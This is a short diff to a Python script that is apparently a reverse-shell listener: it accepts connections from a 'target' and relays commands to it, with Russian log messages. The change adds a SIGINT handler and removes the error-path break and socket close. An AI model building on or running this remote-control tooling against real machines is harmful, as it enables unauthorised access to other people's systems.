@@ -3,6 +3,8 @@ import socket
 import json
 import base64
 import logging
+import signal
+import sys
 
 logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(message)s")
 
@@ -104,12 +106,14 @@ def shell(target, ip):
                 print(response)
         except Exception as e:
             logging.error(f"Ошибка выполнения команды: {e}")
-            break
-    target.close()
 
+def signal_handler(sig, frame):
+    logging.info("\n[!] Сервер остановлен вручную")
+    sys.exit(0)
 
 # подключение и прослушивание
 def server():
+    signal.signal(signal.SIGINT, signal_handler)
     while True:
         try:
             with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
@@ -120,8 +124,6 @@ def server():
                 target, ip = s.accept()
                 logging.info(f"[+] Подключение установлено с {ip}")
                 shell(target, ip)
-        except KeyboardInterrupt:
-            logging.info("\n[!] Сервер остановлен вручную")
         except Exception as e:
             logging.error(f"[!!] Критическая ошибка: {e}")
             break
